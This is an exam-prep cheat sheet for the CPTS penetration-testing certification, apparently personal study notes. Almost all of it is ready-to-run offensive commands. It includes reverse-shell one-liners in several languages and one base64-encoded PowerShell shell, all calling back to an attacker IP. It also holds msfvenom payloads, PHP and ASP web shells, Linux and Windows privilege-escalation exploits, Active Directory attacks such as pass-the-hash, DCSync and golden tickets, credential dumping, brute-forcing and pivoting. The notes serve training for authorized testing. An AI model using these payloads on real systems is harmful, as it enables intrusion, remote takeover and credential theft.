# Quick Reference Card

> **Emergency reference** -- one page for the most common commands you need during the CPTS exam.

---

## Common Ports

| Port | Service | Quick Action |
|------|---------|------------|
| 21 | FTP | `ftp anonymous@<host>` |
| 22 | SSH | `ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 <user>@<host>` |
| 23 | Telnet | `telnet <host>` |
| 25 | SMTP | `nc <host> 25`, `smtp-user-enum` |
| 53 | DNS | `dig axfr @<host> <domain>` |
| 80/443 | HTTP/S | Browser, `whatweb`, `ffuf` |
| 110 | POP3 | `openssl s_client -connect <host>:995` |
| 135 | MSRPC | `rpcclient -U "" -N <host>` |
| 139/445 | SMB | `smbclient -L //<host> -N` |
| 143 | IMAP | `openssl s_client -connect <host>:993` |
| 161 | SNMP | `snmpwalk -v2c -c public <host>` |
| 389/636 | LDAP/S | `ldapsearch -H ldap://<host> -x -b "dc=domain,dc=local"` |
| 443 | HTTPS | `openssl s_client -connect <host>:443` |
| 464 | Kerberos | `kerbrute` / `impacket-GetUserSPNs` |
| 500 | ISAKMP | `ike-scan <host>` |
| 593 | MSRPC over HTTP | Same as 135 |
| 873 | Rsync | `rsync -av --list-only rsync://<host>` |
| 993 | IMAPS | `openssl s_client -connect <host>:993` |
| 995 | POP3S | `openssl s_client -connect <host>:995` |
| 1433 | MSSQL | `mssqlclient.py <user>@<host>` |
| 1521 | Oracle | `odat all -s <host>` |
| 2049 | NFS | `showmount -e <host>`, `mount -t nfs <host>:/share /mnt` |
| 2375 | Docker | `docker -H tcp://<host>:2375 ps` |
| 3306 | MySQL | `mysql -h <host> -u root -p` |
| 3389 | RDP | `xfreerdp /v:<host> /u:<user>` |
| 3632 | Distcc | `nmap -p 3632 --script distcc-cve2004-2687 <host>` |
| 3690 | SVN | `svn checkout svn://<host>` |
| 4369 | Erlang | Check for cookie auth |
| 5432 | PostgreSQL | `psql -h <host> -U postgres` |
| 5900 | VNC | `vncviewer <host>`, `vncsnapshot` |
| 5985/5986 | WinRM | `evil-winrm -i <host> -u <user> -p '<pass>'` |
| 6379 | Redis | `redis-cli -h <host>` |
| 7001 | WebLogic | Check for CVEs |
| 8080 | HTTP-alt | Same as web, often proxy |
| 8443 | HTTPS-alt | Same as web |
| 9200 | Elasticsearch | `curl <host>:9200/_cat/indices` |
| 27017 | MongoDB | `mongo <host>` |
| 50070 | HDFS | Browser -> datanode info |

**Full reference:** [[14 - Common Ports and Services/Port Reference]]

---

## Reverse Shell One-Liners

```bash
# --- LINUX TARGETS ---

# Bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# NC (Netcat)
nc -e /bin/sh 10.10.14.5 4444
# or if no -e:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$s=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.5","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Netcat OpenBSD
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f

# --- WINDOWS TARGETS ---

# PowerShell (base64 encoded)
# Generate with: https://www.revshells.com/
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

# MSFVenom payloads
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o revshell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o revshell.exe
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o revshell.jsp
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -o revshell.php
```

### Listener Commands
```bash
# Netcat basic
nc -lvnp 4444

# Netcat with SSL
ncat --ssl -lvnp 4444

# Metasploit multi-handler
msfconsole -q
msf6 > use exploit/multi/handler
msf6 > set LHOST 0.0.0.0
msf6 > set LPORT 4444
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > exploit

# Socat listener (for encrypted shell)
socat TCP-LISTEN:4444,fork EXEC:/bin/bash

# PwnCat (better interactive shell)
pwncat-cn -lp 4444
```

---

## File Transfer

### Download Files to Target

#### From Linux Attack Box (Python HTTP Server)
```bash
# On attack box
python3 -m http.server 80
python2 -m SimpleHTTPServer 80

# On target Linux
wget http://10.10.14.5/file
curl -O http://10.10.14.5/file

# On target Windows
certutil -urlcache -f http://10.10.14.5/file.exe file.exe
powershell -c "Invoke-WebRequest -Uri http://10.10.14.5/file -OutFile file.exe"
bitsadmin /transfer job /download /priority high http://10.10.14.5/file.exe C:\Windows\Temp\file.exe
```

#### SMB Share
```bash
# On attack box
sudo impacket-smbserver share . -smb2support
sudo impacket-smbserver share /path/to/tools -smb2support -user test -password test

# On Windows target (mount share)
net use \\10.10.14.5\share
copy \\10.10.14.5\share\file.exe .
net use \\10.10.14.5\share /delete

# With credentials
net use \\10.10.14.5\share /user:test test
copy \\10.10.14.5\share\file.exe C:\temp\
```

#### Base64 Transfer
```bash
# On source (encode)
base64 -w0 file
cat file | base64 -w0

# On target (decode)
echo "BASE64STRING" | base64 -d > file
certutil -decode encoded.txt file.exe  # Windows
```

#### Netcat Transfer
```bash
# Receiver (save file)
nc -lvnp 4444 > file

# Sender (send file)
nc 10.10.14.5 4444 < file
```

#### SCP
```bash
scp user@10.10.14.5:/path/to/file .
scp file user@10.10.14.5:/path/to/
```

---

## Linux PE Quick Checks

### Automated
```bash
./linpeas.sh
./lse.sh -l1
./pspy64
```

### Manual -- Always Check These First

```bash
# 1. SUDO
sudo -l

# 2. SUID
find / -perm -4000 2>/dev/null

# 3. Capabilities
getcap -r / 2>/dev/null

# 4. Kernel Version
uname -a
cat /etc/os-release

# 5. Cron Jobs
cat /etc/crontab
cat /var/spool/cron/*
ls -la /etc/cron*
./pspy64  # Watch running processes

# 6. Writable Files
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# 7. Writable /etc/passwd
ls -la /etc/passwd

# 8. PATH Hijack
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys
echo $PATH | tr ':' '\n' | while read d; do ls -ld "$d" 2>/dev/null; done

# 9. Mounts / Shares
cat /etc/fstab
mount -l
cat /etc/exports 2>/dev/null  # NFS exports

# 10. Docker / LXC
groups
docker images 2>/dev/null

# 11. History Files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.viminfo

# 12. Password Reuse
# Check config files, scripts, databases for reused passwords

# 13. tmux / screen sessions
tmux ls 2>/dev/null
screen -ls 2>/dev/null
```

### Common PE One-Liners
```bash
# Sudo: check GTFOBins for specific command
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh \; -quit
sudo nmap --interactive
sudo vim -c '!sh'
sudo python3 -c 'import os; os.system("/bin/sh")'

# SUID (check GTFOBins)
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# CVE-2021-4034 (Polkit)
# CVE-2023-2640 (Ubuntu overlayfs) / CVE-2021-3493 (overlayfs)
# Dirty Pipe CVE-2022-0847 (Linux >= 5.8)

# Docker
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh

# LXC
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test mydevice disk source=/ path=/mnt/root recursive=true
lxc start test
lxc exec test /bin/sh
```

### GTFOBins Quick Reference
```
sudo, suid -> search: https://gtfobins.github.io/gtfobins/
```

---

## Windows PE Quick Checks

### Automated
```powershell
winpeas.exe
.\PowerUp.ps1; Invoke-AllChecks
.\Seatbelt.exe -group=all
.\Sherlock.ps1; Find-AllVulns
```

### Manual -- Always Check These First

```cmd
REM 1. System Info
systeminfo
wmic os get version,caption
wmic qfe list brief   REM Patches

REM 2. Who Am I
whoami
whoami /all          REM Groups + Privileges
whoami /priv         REM Token privileges

REM 3. Users & Groups
net user
net user <username>
net localgroup
net localgroup administrators
net group /domain
net group "Domain Admins" /domain

REM 4. Services
wmic service list brief
sc query
sc qc <servicename>
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

REM 5. Unquoted Service Paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

REM 6. AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

REM 7. Startup Programs
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

REM 8. Password in Files
findstr /si password *.txt *.ini *.config *.xml *.bat *.ps1 *.mdb *.rdp
findstr /si "password" *.* 2>nul

REM 9. Registry Passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

REM 10. Stored Credentials
cmdkey /list
dir /s *password* *cred* *vnc* *.config* 2>nul

REM 11. Scheduled Tasks
schtasks /query /fo LIST /v 2>nul | findstr /i "task" /i "run"

REM 12. Running Processes
tasklist /v
wmic process list brief
```

### Privilege Escalation by Token (whoami /priv)

| Privilege | How to Exploit |
|-----------|---------------|
| SeImpersonatePrivilege | `JuicyPotato`, `RoguePotato`, `PrintSpoofer`, `GodPotato`, `SweetPotato` |
| SeAssignPrimaryTokenPrivilege | Same as above |
| SeBackupPrivilege | `reg save hklm\sam sam.hive`, `robocopy /b` files |
| SeRestorePrivilege | Overwrite system files |
| SeTakeOwnershipPrivilege | `takeown /f file`, `icacls file /grant user:F` |
| SeDebugPrivilege | `mimikatz.exe` (process injection), `procdump` |
| SeLoadDriverPrivilege | Load malicious driver |
| SeTcbPrivilege | Act as part of the OS -- SeCreateTokenPrivilege |

### Common Exploits
```cmd
REM Juicy Potato
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t *

REM PrintSpoofer (Windows 10 1809+)
PrintSpoofer.exe -i -c cmd.exe

REM GodPotato
GodPotato.exe -cmd "cmd /c whoami"

REM MS16-032 (PowerShell)
. .\Invoke-MS16-032.ps1; Invoke-MS16-032

REM Hot Potato (Windows 7/2008)
potato.exe -ip 127.0.0.1 -cmd "net localgroup administrators user /add"

REM AlwaysInstallElevated (if registry values = 1)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o install.msi
msiexec /quiet /qn /i install.msi

REM Unquoted Service Path
REM 1. Find path
wmic service get name,pathname | findstr /i /v "C:\Windows"
REM 2. Check write permissions
icacls "C:\Program Files\Vulnerable Path\"
REM 3. Create malicious exe with service name
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o Service.exe
REM 4. Restart service
sc stop <service>
sc start <service>
```

---

## AD Attack Commands

### Enumeration
```bash
# Users (Kerbrute)
kerbrute userenum -d domain.local --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# BloodHound Python
bloodhound-python -d domain.local -u user -p 'password' -ns 10.10.10.10 -c All

# LDAP Anonymous
ldapsearch -H ldap://10.10.10.10 -x -b "dc=domain,dc=local"
```

### AS-REP Roasting
```bash
impacket-GetNPUsers -dc-ip 10.10.10.10 -usersfile users.txt domain.local/
hashcat -m 18200 hash.txt rockyou.txt
```

### Kerberoasting
```bash
impacket-GetUserSPNs -dc-ip 10.10.10.10 domain.local/user:'password' -request
hashcat -m 13100 hash.txt rockyou.txt
```

### Pass the Hash
```bash
impacket-wmiexec -hashes :NTHASH domain.local/user@10.10.10.20
impacket-psexec -hashes :NTHASH domain.local/user@10.10.10.20
impacket-smbexec -hashes :NTHASH domain.local/user@10.10.10.20
crackmapexec smb 10.10.10.20 -u Administrator -H NTHASH -x whoami
evil-winrm -i 10.10.10.20 -u Administrator -H NTHASH
```

### DCSync (Requires DA)
```bash
impacket-secretsdump -just-dc domain.local/user:'password'@10.10.10.10
impacket-secretsdump domain.local/user:'password'@10.10.10.10
```

### Pass the Ticket
```bash
# Export ticket on Windows
mimikatz # sekurlsa::tickets /export

# Inject ticket
mimikatz # kerberos::ptt ticket.kirbi

# Use on Linux
export KRB5CCNAME=/path/to/ticket.ccache
impacket-wmiexec -k domain.local/user@host.domain.local
```

### Silver Ticket
```bash
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain domain.local -spn cifs/target.domain.local Administrator
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k domain.local/Administrator@target.domain.local -no-pass
```

### Golden Ticket
```bash
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain domain.local Administrator
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k domain.local/Administrator@dc.domain.local -no-pass
```

### AD CS Abuse
```bash
# Enumerate
certipy find -u user@domain.local -p 'password' -dc-ip 10.10.10.10 -vulnerable

# ESC1 - Request cert as DA
certipy req -u user@domain.local -p 'password' -ca CA-SERVER -target domain.local -template VulnTemplate -upn administrator@domain.local

# Authenticate with cert
certipy auth -pfx admin.pfx -dc-ip 10.10.10.10

# ESC3 - Agent enrollment
# ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
# ESC8 - NTLM relay to AD CS
```

### NTLM Relay
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support

# Coerce auth (from compromised machine)
python3 printerbug.py domain.local/user:'password'@10.10.10.20 10.10.14.5
python3 petitpotam.py -d domain.local -u user -p 'password' 10.10.14.5 10.10.10.20
```

### CrackMapExec (NetExec) Cheat Sheet
```bash
# SMB
crackmapexec smb 10.10.10.0/24 -u user -p 'password' --shares
crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt --continue-on-success
crackmapexec smb 10.10.10.10 -u user -p 'password' --sam
crackmapexec smb 10.10.10.10 -u user -p 'password' --lsa
crackmapexec smb 10.10.10.10 -u user -H NTHASH -x whoami
crackmapexec smb 10.10.10.0/24 -u user -p 'password' --gpp-cpassword
crackmapexec smb 10.10.10.0/24 -u user -p 'password' -M spider_plus

# WinRM
crackmapexec winrm 10.10.10.10 -u user -p 'password'
crackmapexec winrm 10.10.10.10 -u user -H NTHASH

# LDAP
crackmapexec ldap 10.10.10.10 -u user -p 'password' -M maq
crackmapexec ldap 10.10.10.10 -u user -p 'password' --gmsa

# MSSQL
crackmapexec mssql 10.10.10.10 -u sa -p 'password'
```

---

## Pivoting Quick Start

```bash
# Chisel (fastest setup)
# Attack box:
chisel server -p 8080 --reverse
# Compromised host:
chisel client 10.10.14.5:8080 R:socks
# proxychains:
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn -p 445,3389 10.10.20.0/24

# Ligolo-ng
# Attack box:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.20.0/24 dev ligolo
./proxy -selfcert -laddr 0.0.0.0:443
# Agent on target:
./agent -connect 10.10.14.5:443 -ignore-cert
# In proxy:
ligolo-ng >> session
ligolo-ng >> start

# SSHuttle (VPN-like)
sshuttle -r user@10.10.10.10 10.10.20.0/24

# SSH Dynamic Proxy
ssh -D 9050 user@10.10.10.10

# SSH Local Port Forward
ssh -L 3389:target-internal:3389 user@jumphost

# Socat Port Forward
socat TCP-LISTEN:4444,fork TCP:10.10.20.20:445
```

---

## Metasploit Quick Commands

```bash
msfconsole -q

# Search
msf6 > search eternalblue
msf6 > search type:exploit platform:windows target:2008

# Common modules
msf6 > use exploit/multi/handler
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > use exploit/linux/http/struts2_content_type_ognl
msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 > use auxiliary/scanner/smb/smb_login
msf6 > use auxiliary/gather/ldap_search
msf6 > use post/windows/gather/hashdump
msf6 > use post/multi/recon/local_exploit_suggester

# Pivoting
msf6 > route add 10.10.20.0 255.255.255.0 1
msf6 > use auxiliary/server/socks_proxy
```

---

## Hash Identification

```bash
# Identify hash type
hashid -m hash.txt
hash-identifier
```

| Hash Mode | Type | Command |
|-----------|------|---------|
| 1000 | NTLM | `hashcat -m 1000 hash.txt rockyou.txt` |
| 13100 | Kerberos TGS-REP | `hashcat -m 13100 hash.txt rockyou.txt` |
| 18200 | AS-REP | `hashcat -m 18200 hash.txt rockyou.txt` |
| 5600 | Kerberos 5 TGS | `hashcat -m 5600 hash.txt rockyou.txt` |
| 5500 | Kerberos 5 AS-REQ | `hashcat -m 5500 hash.txt rockyou.txt` |
| 1800 | SHA-512 (Linux shadow) | `hashcat -m 1800 hash.txt rockyou.txt` |
| 500 | MD5 (Linux shadow) | `hashcat -m 500 hash.txt rockyou.txt` |
| 3200 | bcrypt | `hashcat -m 3200 hash.txt rockyou.txt` |
| 17200 | PKZIP (compressed) | `hashcat -m 17200 hash.txt rockyou.txt` |

```bash
# John
john --wordlist=rockyou.txt hash.txt
john --show hash.txt

# Hashcat (with rules)
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## Web Shell / Web Attack Quick Reference

```bash
# PHP Web Shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Access: http://target/shell.php?cmd=id

# ASP Web Shell
echo '<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>' > shell.asp

# JSP Web Shell (within Tomcat etc.)
# Deploy .war via manager, or upload shell.jsp

# SQLMap Quick
sqlmap -u "http://target/page.php?id=1" --batch --dbs
sqlmap -u "http://target/page.php?id=1" -D db --tables
sqlmap -u "http://target/page.php?id=1" -D db -T users --dump
sqlmap -u "http://target/page.php?id=1" --os-shell
sqlmap -r request.txt --batch

# Hydra Quick
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=Incorrect"
hydra -L users.txt -p 'Password1' rdp://10.10.10.10
hydra -l root -P rockyou.txt ssh://10.10.10.10
```

---

## Reporting Quick Commands

```bash
# Create report structure
mkdir -p ~/cpts-report/{executive-summary,findings,appendices,screenshots,scans}

# Generate CVSS 3.1 vector
# Bookmark: https://www.first.org/cvss/calculator/3.1
```

---

## Emergency Checklist (When Stuck)

```
Stuck? Go back to basics:
1. Did you run a FULL port scan? (nmap -p-)
2. Did you check UDP? (nmap -sU --top-ports 20)
3. Did you check for null/guest sessions on SMB/RPC?
4. Did you run BloodHound?
5. Did you check every web parameter for injection?
6. Did you look at the source code of every web page?
7. Did you check for hidden directories/files?
8. Did you try default credentials everywhere?
9. Did you search for exploits with searchsploit?
10. Did you run linpeas/winpeas?
11. Did you check for cron jobs (pspy)?
12. Did you check for password reuse?
13. Did you pivot to other network segments?
14. Did you check all hosts in the exam range?
```

*See also: [[00 - Methodology and Workflow/CPTS Methodology]], [[00 - Methodology and Workflow/CPTS Exam Checklist]], [[14 - Common Ports and Services/Port Reference]]*
